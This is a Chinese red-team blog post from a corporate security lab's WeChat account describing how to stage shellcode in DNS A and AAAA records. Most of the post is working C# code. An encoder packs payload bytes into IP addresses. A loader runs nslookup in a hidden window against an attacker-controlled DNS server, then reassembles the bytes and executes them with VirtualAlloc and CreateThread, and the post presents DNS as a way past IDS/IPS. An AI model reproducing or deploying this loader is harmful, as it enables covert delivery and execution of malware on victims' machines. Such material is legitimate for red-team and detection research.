#  利用DNS A记录执行Shellcode

罗逸  [ 平安集团安全应急响应中心 ](javascript:void\(0\);)

**平安集团安全应急响应中心** ![]()

微信号 PSRC_Team

功能介绍 平安集团安全应急响应中心隶属于平安科技，是外部用户向平安集团反馈各产品和业务安全漏洞的平台，也是平安科技加强与安全界和同仁合作交流的渠道之一。

____

__

收录于话题

#PSRC 64 个

#漏洞分析 5 个

**  
**

**作者简介  **/Profile/

罗逸，平安科技银河实验室资深安全研究员，从业7年，专注红蓝对抗研究，擅长免杀技术、目标控制、内网渗透等。

  
  

  * 0x01 什么是dns A记录

  * 0x02 DNS A记录的利用思路

  *          2.1 工具DNSmasq

  *          2.2 利用思路

  *          2.3 dns A记录传输数据优点

  * 0x03 IPV4 DNS A记录的利用设计

  *          3.1 使用限制

  *          3.2 设计思路

  *          3.3 代码实现

  *                  3.3.1 Dns_Create

  *                  3.3.2 开启DNS服务器

  *                  3.3.3 读取DNS A记录的Loader

  *          3.4 利用结果

  * 0x04 IPV6 DNS A记录的利用设计

  *          4.1 ipv6格式

  *          4.2 ipv6解析详情

  *          4.3 IPV6 DNS A记录传输数据

  *          4.4 C#实现IPV6 DNS A记录传输数据

  *                  4.4.1 DnsCreater

  *                  4.4.2 开启dns服务

  *                  4.4.3 IPV6 DNS A记录Loader

  *          4.5 利用结果

  * 0x05 拓展思路

  * 0x06 结论

  

 **0x01 什么是DNS A记录**

  

#

我们都知道DNS（Domain Name
System，域名系统），是互联网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。它运行在UDP协议之上，端口为53。
那什么是DNS
A记录呢？其实DNS也分为别名记录、A记录、NS记录和MX记录等，而A记录是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的web
server上，同时也可以设置您域名的二级域名。 如下是microsoft.com在谷歌dns上解析的A记录：

  *   *   *   *   *   * 

    
    
    λ nslookup micorsoft.com 8.8.8.8服务器:  google-public-dns-a.google.comAddress:  8.8.8.8非权威应答:名称:    micorsoft.comAddress:  209.15.13.134

解析出了micorsoft.com的IP地址为209.15.13.134。  
  

 **0x02  DNS A记录的利用思路**

  

##  **2.1 工具DNSmasq**

  

DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，通过它就能简便的将自己配成一台dns服务器。选用它是因为它小巧，简易便于我们修改解析数据。
首先我们需要添加域名对应解析的IP地址，因为DNSmasq是读取的本机的/etc/hosts的，所以我们在里面添加一条解析。

  *   *   * 

    
    
    vim /etc/hosts#添加下面一行192.168.1.22 java.com

  
然后运行DNSmasq：

  * 

    
    
    dnsmasq --no-daemon --log-queries

  
这时候一个简易的dns服务器就搭建好了。查看这台vps的ip（dns server）：  
![](https://gitee.com/fuli009/images/raw/master/public/20220228185958.png)  
这时候我们将nslookup的dns server设置成我们自己的ip，来看java.com解析出的A记录：  

![](https://gitee.com/fuli009/images/raw/master/public/20220228185959.png)

  
如图，解析出来的A记录的ip地址就是我们自己设定的ip地址。  

##  **2.2 利用思路**

  

由上面我们可以知道，通过dns A记录查询，可以得到我们自定义的数据。那么我们就有一个思路了，我们可以将DNS
A记录自定义成我们的payload数据，然后在受害者的机器上通过DNS 解析来获得数据，然后再来加载执行它。  

##  **2.3 dns A记录传输数据优点**

  

那我们使用dns A记录来传输数据有什么优点呢？最明显也是最大的优点就是在内网中IDS/IPS等防火墙设备一般是不会监控DNS协议的数据的。  
  

 **0x03  IPV4 DNS A记录的利用设计**

  

##  **3.1 使用限制**

  

那我们如何来设计一个合理的利用过程呢？首先我们需要明白DNS A记录解析的限制。 dns
A记录能解析的数据是ip数据，也就是说它能解析出0-255的数据。例如：

  *   *   *   * 

    
    
    0.0.51.66 java.com    #能解析192.168.1.255 java.com    #能解析192.168.1.256 java.com    #不能解析192.168.333.255 java.com    #不能解析

  
这就要求我们的payload的字节的ASCII值没有超过256的，幸运的是meterpreter和beacon的payload的字节都没有超过256的，所以能适用。具体解析的形式如下：

  * 

    
    
    [xxx.xx.xxx].[yyy]

  
通过上述传输数据设计，能得出单个域名解析传输数据的最大值是：3 * 256 = 768 byte. DNS
A记录解析的IP地址数据是无序的，也就是说如果我们将payload数据填充为ip数据的4位，然后通过DNS
A记录来解析，得到的数据是凌乱的，payload是无法执行的。  

##  **3.2 设计思路**

  

根据以上的限制，我们就要设计出一种合理的利用方式。  

  * 首先解决DNS A记录解析无序的问题

  
我们将解析的ip地址的前三位用来填充payload数据，最后一位用来表明数据的顺序，最后在接收到dns
A记录数据之后，再根据最后一位来排序，得到正确的payload数据。  

  * 解决合理的IP数据解析的问题

  
在payload自身没有存在字节ASCII值超过256的时候，但是payload的长度超过256*3=768，我们采用上述排序的方法，最后一位的大小就会超出0-255。所以这时候我们就要分成多域名解析，比如payload的前768字节填充成ip后解析为Microsoft.com的DNS
A记录，剩余的数据填充成ip后解析成Google.com的DNS A记录，以此类推来达到传输全部payload数据的要求。
上诉都是基于IPV4的DNS解析的，其实如果是基于IPV6的DNS解析，这些限制都不会存在，后续讨论。  

##  **3.3 代码实现**

  

###  3.3.1 Dns_Create

  

它是用来创建dns A记录的程序，即将我们输入的payload数据转换成 DNS A记录数据。 先将payload数据格式化成数组

  * 

    
    
    string[] payload = _Payload.Replace(" ", "").Split(',');

  
将16进制的payload转换成10的ASCII值存放

  *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    int ip_counter = 0;if (payload.Length % 3 == 0){    ip_counter = payload.Length / 3;}else{    ip_counter = (payload.Length / 3 + 1);}int[] payload_int = new int[ip_counter * 3];for (int i = 0; i < payload.Length; i++){    payload_int[i] = Convert.ToInt32(payload[i], 16);}

  
如上，要看payload的长度是否超过3*256=768来决定是否使用多域名解析，并打印出DNS A记录解析的格式。  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    if (ip_counter <= 256){    for (int i = 0; i < ip_counter; i++)    {        string ip = null;        for (int j = 0; j < 3; j++)        {            ip += payload_int[i * 3 + j] + ".";        }        Console.WriteLine("{0} {1}", ip + i, "Microsoft.com"); //注意此处填充ip的最后一位i,其实是payload的排列顺序，在得到解析数据后要根据它来排序出正确顺序的payload。    }}else{    ...}

  
得到的最红解析的格式如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    252.232.137.0 Microsoft.com0.0.0.1 Microsoft.com96.137.229.2 Microsoft.com49.210.100.3 Microsoft.com139.82.48.4 Microsoft.com139.82.12.5 Microsoft.com...198.139.7.11 Google.com1.195.133.12 Google.com192.117.229.13 Google.com88.195.232.14 Google.com137.253.255.15 Google.com255.49.48.16 Google.com46.48.46.17 Google.com48.46.56.18 Google.com0.0.0.19 Google.com0.0.0.20 Google.com

  

### 3.3.2 开启DNS服务器

  

前文中我们提到过使用DNSmasq来做一个简便的dns服务器。过程很简单： 编辑/etc/hosts，将上述程序得到的DNS A记录数据添加进去：

  *   *   *   *   *   *   *   *   * 

    
    
    vim /etc/hosts96.137.229.2 Microsoft.com49.210.100.3 Microsoft.com139.82.48.4 Microsoft.com139.82.12.5 Microsoft.com...198.139.7.11 Google.com1.195.133.12 Google.com192.117.229.13 Google.com

  
启动DNSmasq

  *   * 

    
    
    dnsmasq    #启动dnsmasqdnsmasq --no-daemon --log-queries    #记录日志

  
nalookup测试数据  

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    λ nslookup microsoft.com 10.0.0.88服务器:  UnKnownAddress:  10.0.0.88名称:    microsoft.comAddresses:  0.0.0.1          96.137.229.2          49.210.100.3          139.82.48.4          139.82.12.5          139.82.20.6          139.114.40.7          15.183.74.8

  

### 3.3.3 读取DNS A记录的Loader

  

现在有了dns A记录的数据了，那我们怎么来获得它？怎么来由dns A记录还原出payload？怎么来执行payload呢？思路如下：
使用C#运行cmd命令，执行nslookup来回去DNS A记录数据

  *   *   *   *   *   *   *   *   * 

    
    
    ProcessStartInfo ns_Prcs_info = new ProcessStartInfo("nslookup.exe", DomainName + " " + DnsServer);ns_Prcs_info.RedirectStandardInput = true;ns_Prcs_info.RedirectStandardOutput = true;ns_Prcs_info.UseShellExecute = false;Process nslookup = new Process();nslookup.StartInfo = ns_Prcs_info;nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;nslookup.Start();string computerList = nslookup.StandardOutput.ReadToEnd();

  
这一步得到的数据是：

  *   *   *   *   *   * 

    
    
    服务器:  UnKnownAddress:  10.0.0.88名称:    microsoft.comAddresses:  0.0.0.1          96.137.229.2          49.210.100.3

  
而真实的payload和顺序数据只是在IP地址中，所以下一步是解析数IP地址数组。 解析ip地址数组

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    //格式化接收到的数据string[] lines = computerList.Replace("\t","").Replace("\r","").Split('\n');int ID = 0;//删除解析头数据foreach (var item in lines){    if (item.Contains(DNS_PTR_A))    {        break;    }    ID++;}//将解析的ip数据存入数组List<string> A_Records = new List<string>();try{    int FindID_FirstAddress = ID + 1;    A_Records.Add(lines[FindID_FirstAddress].Split(':')[1].Substring(2));    for (int iq = FindID_FirstAddress + 1; iq < lines.Length - 2; iq++)    {        A_Records.Add(lines[iq].Replace(" ",""));    }}

  
排序ip数据

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    List<int> Keys = new List<int>();List<string> Values = new List<string>();foreach (var item in A_Records){    int key = int.Parse(item.Split('.')[3]);    Keys.Add(key);    Values.Add(item);}var dict = new Dictionary<int, string>();for (int i = 0; i < Keys.Count; i++)    dict.Add(Keys[i], Values[i]);Keys.Sort();List<string> sortedVals = new List<string>();for (int i = 0; i < Keys.Count; i++){    sortedVals.Add(dict[Keys[i]]);}

  
还原出payload字节数组

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    byte[] XxXPayload = new byte[sortedVals.Count * 3];Int32 Xnumber = 0;for (int i = 0; i < sortedVals.Count; i++){    string[] temp = sortedVals[i].Split('.');    XxXPayload[Xnumber] = Convert.ToByte(temp[0]);    XxXPayload[Xnumber + 1] = Convert.ToByte(temp[1]);    XxXPayload[Xnumber + 2] = Convert.ToByte(temp[2]);    Xnumber++;    Xnumber++;    Xnumber++;}

  
经过这样4步就能得到解析一个域名的DNS A记录。那如果是payload的数据过长，我们采用的多域名解析，就还要将后面的域名DNA
A记录解析数据拼接起来才是完整的payload数据。 多域名解析，拼接完整payload

  *   *   *   *   *   *   * 

    
    
    List<byte> data = new List<byte>();byte[] data1 = __nslookup("Microsoft.com", dns_server);data.AddRange(data1);byte[] data2 = __nslookup("Google.com", dns_server);if(data2 != null)    data.AddRange(data2);byte[] _Exfiltration_DATA_Bytes_A_Records = data.ToArray();

  
通过上面5步，我们就可以获得完整、准确的payload数据。 执行payload

  *   *   *   *   *   *   * 

    
    
    UInt32 funcAddr = VirtualAlloc(0, (UInt32)_Exfiltration_DATA_Bytes_A_Records.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);Marshal.Copy(_Exfiltration_DATA_Bytes_A_Records, 0, (IntPtr)(funcAddr), _Exfiltration_DATA_Bytes_A_Records.Length);IntPtr hThread = IntPtr.Zero;UInt32 threadId = 0;IntPtr pinfo = IntPtr.Zero;hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);WaitForSingleObject(hThread, 0xFFFFFFFF);

  

##  **3.4 利用结果**

  

生成DNS A记录
![](https://gitee.com/fuli009/images/raw/master/public/20220228190000.png)  
启动dns解析服务  
![](https://gitee.com/fuli009/images/raw/master/public/20220228190001.png)  
运行解析结果
![](https://gitee.com/fuli009/images/raw/master/public/20220228190002.png)  
  

 **0x04  IPV6 DNS A记录的利用设计**

  

##  **4.1 ipv6格式**

  

我们先来看IPV6的格式

  * 

    
    
    fe80:1111:0034:abcd:ef00:ab11:ccf1:0000

  
同ipv4一样，在解析ipv6地址的时候也是无序的，所以我们将最后一个段用来做序号，前面7段用来做payload的载体，如下：  

  * 

    
    
    [xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx]:[yyyy]

  
这样能传输的数据最大值就能计算出来，每行有7段用来传输数据，就能传输28个字符，14个字节，所以最大的单个域名传输数据是：9999 * 14 =
139986b =
136.70KB，这个数据已经足够大了，还愁不能传输几百字节的payload吗？这样就能解决ipv4中对单个域名解析传输数据长度受限的问题（虽然我们前面解决这个问题的方式是通过多域名解析）。  

##  **4.2 ipv6解析详情**

  

由于ipv6存在一种0位压缩表示法，即在某些情况下，一个IPv6地址中间可能包含很长的一段0，可以把连续的一段0压缩为“::”。但为保证地址解析的唯一性，地址中”::”只能出现一次。比如：

  *   *   *   *   * 

    
    
    4805:0000:0000:0011:e87f:0000:0000:0065    -    4805::11:e87f:0:0:650000:0000:0000:302e:302e:3800:FFFF:0066    -    ::302e:302e:3800:ffff:663800:0000:0000:302e:302e:3800:FFFF:0066    -    3800::302e:302e:3800:ffff:663800:0000:0000:0000:0000:3800:FFFF:0066    -    3800::3800:ffff:663800:0000:0000:0000:0000:3800:0000:0066    -    3800::3800:0:66

  
这时候就会出现一个问题，如果我们传输的数据里出现连续的00，利用ipv6来解析的话，就会把这些00都省略了，无法保证数据的完整性。比如：

  *   *   *   *   *   *   *   * 

    
    
    #payload:0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2#格式化成ipv6的解析格式（FFFF是对当payload不是14的倍数时，对ipv6地址的填充）fc48:83e4:f0e8:c800:0000:0000:4150:52515648:31d2:FFFF:FFFF:FFFF:FFFF:FFFF:FFFF#解析结果fc48:83e4:f0e8:c800::4150:52515648:31d2:ffff:ffff:ffff:ffff:ffff:ffff

  
如上，数据发生了变化。使用nslookup验证

  *   *   *   *   *   * 

    
    
    λ nslookup test.com 10.0.0.88服务器:  UnKnownAddress:  10.0.0.88名称:    test.comAddresses:  fc48:83e4:f0e8:c800::4150:5251          5648:31d2:ffff:ffff:ffff:ffff:ffff:ffff

  

##  **4.3 IPV6 DNS A记录传输数据**

  

经过上述分析，我们知道想通过DNS AAAA的ipv6解析来传输数据会存在下面两个问题：

  1. 解析数据的无序性

  2. ipv6的压缩表示法造成的数据不完整

  
我们一一的来寻找解决办法。 对于第一点，我们同ipv4解析一样，利用ipv6的最后一个段来存放数据顺序，解析之后再进行排序恢复。
对于第二点，个人暂时还没有找到完美的办法解决，这里暂时使用的字符替换方法。由于必须构造一个合法的ipv6地址，所以我们不能对传输的数据进行加密后再格式化成ipv6形式，再选择替换00的字符串时也不能时xx这种不合法的字符串，所以我们这里暂时选取出现概率较少的aa来替换00。  
但是如果源数据中就包含aa，那数据完整性也不能得到保障，这个字符串可以根据自己传输的数据来实际选择。还好我们用来传输payload的话，字节数较少，很容易找到一个字符串来替换00。  

##  **4.4 C#实现IPV6 DNS A记录传输数据**

  

###  4.4.1 DnsCreater

  

这个程序的作用和ipv4版本一样就是将我们的payload数据格式化成DNS AAAA解析的ipv6地址形式。 将payload格式化成数组，并替换00

  * 

    
    
    string[] payload = _Payload.Replace(" ", "").Replace("0x","").Replace("00","aa").Split(',');

  
计算需要的ipv6地址数

  *   *   *   *   *   *   *   *   * 

    
    
    int ip_counter = 0;if (payload.Length % 14 == 0){    ip_counter = payload.Length / 14;}else{    ip_counter = (payload.Length / 14 + 1);}

  
填充单个ipv6地址  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    int n = 0;int f = 0;try{    for (; n < 7; n++)    {        for (int m = 0; m < 2; m++)        {            p += payload[flag];            f++;            flag++;        }        p += ":";        f = 0;    } }

  
如果payload不是14的倍数，要将最后一个ipv6地址用ff填充成正常形式

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    catch{    switch (n)    {        case 0: p += "FF:FFFF:FFFF:FFFF:FFFF:FFFF:FFFF:"; break;        case 1:            if (f == 0) {                p += "FFFF:FFFF:FFFF:FFFF:FFFF:FFFF:";            }            else            {                p += "FF:FFFF:FFFF:FFFF:FFFF:FFFF:";            }            break;        ...    }}

  
输出ipv6解析形式，这里ipv6的前7段时payload数据，最后一段表示的是顺序。而这里我们以解析Microsoft.com为例。

  *   * 

    
    
    int v = i + 1;Console.WriteLine("{0}{1} {2}", p, v.ToString("0000"), "Microsoft.com");

  
输出结果

  *   *   *   *   *   * 

    
    
    fc48:83e4:f0e8:c8aa:aaaa:4151:4150:0001 Microsoft.com5251:5648:31d2:6548:8b52:6048:8b52:0002 Microsoft.com1848:8b52:2048:8b72:5048:0fb7:4a4a:0003 Microsoft.com...4805:aaaa:aaaa:50c3:e87f:fdff:ff31:0065 Microsoft.com302e:302e:302e:38aa:aaaa:aaaa:FFFF:0066 Microsoft.com

  

### 4.4.2 开启dns服务

  

这里开启dns服务步骤和ipv4的一样，就不再介绍。  

### 4.4.3 IPV6 DNS A记录Loader

  

此程序和ipv4的作用一样，是一个payload loader。通过DNS AAAA解析来获得payload数据。
程序的前半部分和ipv4的一样，通过nslookup来获得DNS
AAAA解析数据。后面由于ipv6的0位压缩表示法，会将01c1这种数据压缩成1c1，但是我们FF替换是00而没有处理这种数据，所以需要对ipv6的每一段进行一次填0处理，来确保数据的完整性。
填0函数

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public static string __zero(string str){    string[] temp_normalize = str.Split(':');    for (int ix = 0; ix < temp_normalize.Length; ix++)    {        int count = temp_normalize[ix].Length;        if (count < 4)        {            Console.ForegroundColor = ConsoleColor.Green;            for (int j = 0; j < 4 - count; j++)            {                temp_normalize[ix] = "0" + temp_normalize[ix];            }        }    }    return string.Join(":", temp_normalize);}

  
获得nslookup数据后，解析处理后的payload的第一行，并进行填0

  *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    string[] All_lines = computerList.Replace("\t", "").Replace("\r", "").Split('\n');int start = 0;List<string> A_Records = new List<string>();for (int x = 0; x < All_lines.Length; x++){    if (All_lines[x].ToUpper().Contains("ADDRESSES:"))    {        int f = All_lines[x].IndexOf("Addresses:  ") + "Addresses:  ".Length;        string str = All_lines[x].Substring(f, All_lines[x].Length - 12);        A_Records.Add(__zero(str));        start = x;        break;    }}

  
解析后续的payload并填0  

  *   *   *   *   * 

    
    
    for(int i = start + 1; i < All_lines.Length - 2; i++){    string str = All_lines[i].Replace(" ", "");    A_Records.Add(__zero(str));}

  
排序解析后的ipv6数据，并将每个ipv6地址包含的payload数据恢复出来，然后拼接。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    List<string> Keys = new List<string>();List<string> Values = new List<string>();foreach (var item in A_Records){    string key = item.Split(':')[7];    Keys.Add(key);    string value = "";    for(int i = 0; i <= 6; i++)    {        value += item.Split(':')[i];    }    Values.Add(value);}var dict = new Dictionary<string, string>();for (int i = 0; i < Keys.Count; i++)    dict.Add(Keys[i], Values[i]);Keys.Sort();string DATA = "";for (int i = 0; i < Keys.Count; i++){    DATA += dict[Keys[i]];}

  
此时的数据还是原始payload替换00之后的数据，所以下一步我们就是将payload字符串格式化成字节数组，并将aa替换成00，来还原原始的payload。

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    string tmp = string.Empty;byte[] __Bytes = new byte[DATA.Length / 2];string t = string.Empty;for (int i = 0; i < __Bytes.Length; i++){    int str_start = i * 2;    tmp = DATA.Substring(str_start, 2);    if (tmp == "aa")        tmp = "00";    t += tmp;    byte current = Convert.ToByte("0x" + tmp.ToString(), 16);    __Bytes[i] = current;}

  
其实到这里，我们获得的数据还是和原始的payload数据不一样，因为我们再构造正确的IPV6地址格式的时候，再payload的末尾填充了FF，但是这里的FF并不会影响payload的运行，所以就不处理了。  

##  **4.5 利用结果**

![](https://gitee.com/fuli009/images/raw/master/public/20220228190003.png)

#  

  

 **0x05 拓展思路**

  
这里我们是利用的自己的dns服务器，解析的合法域名的的A记录数据。那我们能不能利用自己的域名的A记录解析来作为数据传输的载体呢？比如我们购买亚马逊的aws和域名，然后添加我们的A记录数据为payload数据。  

  

 **0x06 结论**

  
DNS协议在很多的IDS/IPS设备中都是不被检测的，利用DNS解析来作为数据传输还是很有安全保证的。缺点就是构造相对麻烦，也有对payload字节的特定限制。  
  

银河实验室

![](https://gitee.com/fuli009/images/raw/master/public/20220228190004.png)

银河实验室（GalaxyLab）是平安集团信息安全部下一个相对独立的安全实验室，主要从事安全技术研究和安全测试工作。团队内现在覆盖逆向、物联网、Web、Android、iOS、云平台区块链安全等多个安全方向。官网：http://galaxylab.pingan.com.cn/

  

  

往期回顾

  

技术

[](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652140750&idx=1&sn=907ceb3795a13e8b54910f67e67e8938&chksm=f320d86ec4575178eec0aed8e50d4a1c4ad91aa2edfde855fcf0bfa0d80301f33459c688a07f&scene=21#wechat_redirect)[利用图片隐写执行shellcode](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652141673&idx=1&sn=4fc049ae7314df7fadf2687c09d79b21&chksm=f320d4c9c4575ddf13bcbb562d1032c53cba54d04a8f60ca2c9c93192d6a992dd677ccb91dad&scene=21#wechat_redirect)  

技术  

[【干货】cobaltstrike通信协议研究](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652141637&idx=1&sn=254a93685cbb0dee172dadcca7fff3ef&chksm=f320d4e5c4575df3f393e3b60fad4075dc275933eb0aea6267bcc84f1afa84479eb7aac846f0&scene=21#wechat_redirect)  

技术

[TP-Link XDR-5430-V2 研究分享 -
第一章](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652141409&idx=1&sn=9d11237b4ea6457431de5bcf72e6a786&chksm=f320dbc1c45752d718b086a1061ba806efd741f54384d9bf4f063fb0f6dc1d52c77d39b64def&scene=21#wechat_redirect)  

技术

[Nexus Repository
Manager历史表达式注入漏洞分析](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652140927&idx=1&sn=9a6fe102df545083af8516b69931685c&chksm=f320d9dfc45750c99e142219860c414dd208891be7d93a0dd619394d97cb0eeae48a37761b8e&scene=21#wechat_redirect)  

  

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20220228190005.png)![]()![](https://gitee.com/fuli009/images/raw/master/public/20220228190006.png)

 **长按识别二维码关注我们**

 **微信号：PSRC_Team**

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20220228190007.png)

 **球分享**

![](https://gitee.com/fuli009/images/raw/master/public/20220228190007.png)

 **球点赞**

![](https://gitee.com/fuli009/images/raw/master/public/20220228190007.png)

 **球在看**

  

  

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

利用DNS A记录执行Shellcode

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

